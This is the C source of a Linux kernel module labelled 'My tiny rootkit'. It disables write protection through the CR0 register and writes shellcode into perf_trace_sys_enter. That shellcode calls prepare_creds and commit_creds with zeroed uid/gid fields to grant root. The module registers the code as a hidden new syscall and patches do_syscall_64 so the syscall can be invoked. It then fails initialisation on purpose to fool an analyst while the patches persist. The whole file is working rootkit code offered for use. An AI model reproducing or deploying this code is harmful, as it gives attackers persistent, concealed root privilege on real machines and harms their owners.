#include <asm/processor-flags.h>
#include <asm/syscall.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>

//
//  This array correspond to the following code:
//
//    0xffffffff810019f0 <+0>:     call   0xffffffff8106a410 <prepare_creds>
//    0xffffffff810019f5 <+5>:     mov    QWORD PTR [rax+0x4],0x0
//    0xffffffff810019fd <+13>:    mov    QWORD PTR [rax+0xc],0x0
//    0xffffffff81001a05 <+21>:    mov    QWORD PTR [rax+0x14],0x0
//    0xffffffff81001a0d <+29>:    mov    rdi,rax
//    0xffffffff81001a10 <+32>:    call   0xffffffff8106a090 <commit_creds>
//    0xffffffff81001a15 <+37>:    xor    eax,eax
//    0xffffffff81001a17 <+39>:    ret
//
static char rootkit_sys_root[] = { 0xe8, 0x1b, 0x8a, 0x06, 0x00, 0x48, 0xc7, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x40, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x40, 0x14, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc7, 0xe8, 0x7b, 0x86, 0x06, 0x00, 0x31, 0xc0, 0xc3 };

//
// Helpers to interract with the cr0 register
//
static inline unsigned long __read_cr0(void) {
	unsigned long val;
	asm volatile("mov %%cr0,%0\n\t" : "=r" (val), "=m" (__force_order));
	return val;
}

static inline void __write_cr0(unsigned long val) {
	asm volatile("mov %0,%%cr0": : "r" (val), "m" (__force_order));
}

//
// Helpers to set/unset the WR bit of the cr0 register.
// Really helpful as we must be able to write even pages
// which are not marked as writable.
//
static inline void rootkit_enable_writes(void) {
    __write_cr0(__read_cr0() & ~X86_CR0_WP);
}

static inline void rootkit_disable_writes(void) {
    __write_cr0(__read_cr0() | X86_CR0_WP);
}

//
// Write the payload into the perf_trace_sys_enter function and add the pointer to this function
// at the end of the syscall table.
//
static void rootkit_add_syscall(void) {
    int i;
    sys_call_ptr_t *rootkit_sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
    char *rootkit_sys_root_persistent_location = (char *)kallsyms_lookup_name("perf_trace_sys_enter");
    rootkit_enable_writes();
    for(i=0; i<sizeof(rootkit_sys_root); i++) {
        rootkit_sys_root_persistent_location[i] = rootkit_sys_root[i];
    }
    rootkit_sys_call_table[__NR_rseq+1] = (sys_call_ptr_t)rootkit_sys_root_persistent_location;
    rootkit_disable_writes();
}

//
// Patch the following do_syscall_64 instructions:
//
//    0xffffffff81001df7 :    cmp    rdi,0x14e
//    0xffffffff81001e00 :    cmp    rdi,0x14f
//
// into:
//
//    0xffffffff81001df7 :    cmp    rdi,0x14f
//    0xffffffff81001e00 :    cmp    rdi,0x150
//
// to allow our new syscall to be called.
//
static void rootkit_patch_do_syscall_64(void) {
    char *do_syscall_64_arr = (char *)kallsyms_lookup_name("do_syscall_64");
    rootkit_enable_writes();
    do_syscall_64_arr[42] = 0x4f;
    do_syscall_64_arr[51] = 0x50;
    rootkit_disable_writes();
}

static int __init rootkit_init(void) {
    rootkit_add_syscall();
    rootkit_patch_do_syscall_64();
    //
    // Enforce module to be removed from ram and write an error in dmesg to
    // fool the analyst
    //
    return -1;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_AUTHOR("aiglematth");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("My tiny rootkit");
MODULE_VERSION("0.1");